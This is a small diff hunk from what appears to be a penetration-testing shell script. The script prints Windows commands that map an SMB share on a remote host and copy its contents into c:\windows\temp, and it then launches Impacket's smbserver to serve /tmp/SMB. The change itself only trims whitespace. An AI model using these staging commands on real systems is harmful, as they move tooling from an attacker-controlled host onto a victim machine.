@@ -38,7 +38,7 @@ echo " "
    			echo  net use x: /d \\\\$ip\\SMB
 		done
 	echo "                                    MOVE CONTENTS TO TMP                                         "
-	echo " xcopy x:\ c:\windows\temp /h/i/c/k/e/r/y                                                         "
+	echo "xcopy x:\ c:\windows\temp /h/i/c/k/e/r/y                                                         "
 	echo "[------------------------------------------------------------------------------------------------]"
 
 	python /opt/impacket/examples/smbserver.py SMB /tmp/SMB
